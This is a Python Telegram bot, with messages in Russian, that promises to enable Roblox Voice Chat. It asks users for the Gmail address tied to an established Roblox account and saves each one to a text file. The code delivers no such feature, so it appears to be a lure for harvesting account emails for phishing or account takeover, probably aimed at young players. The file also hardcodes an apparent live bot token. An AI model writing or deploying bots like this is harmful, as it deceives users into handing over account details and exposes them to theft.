from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# Хранилище Gmail
GMAIL_FILE = "gmails.txt"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Здравствуйте 👋\n\n"
        "Если хотите сделать Roblox Voice Chat 🎧\n"
        "Отправьте свой Gmail.\n\n"
        "⚠️ Важно:\n"
        "• Gmail должен быть привязан к Roblox\n"
        "• Новый аккаунт не подходит ❌"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if "@" in text and "." in text:
        with open(GMAIL_FILE, "a", encoding="utf-8") as f:
            f.write(text + "\n")

        await update.message.reply_text(
            "✅ Gmail сохранён!\n"
            "Ожидайте, мы скоро свяжемся с вами."
        )
    else:
        await update.message.reply_text(
            "❌ Это не похоже на Gmail.\n"
            "Пожалуйста, отправьте корректный email."
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start — начать\n"
        "/help — помощь\n\n"
        "Просто отправьте Gmail сообщением."
    )

def main():
    TOKEN = "8571149593:AAF26QU_3rt5rpQVkzN4xVeSRJhLfY9Delg"

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Бот запущен...")
    app.run_polling()

if __name__ == "__main__":
    main()
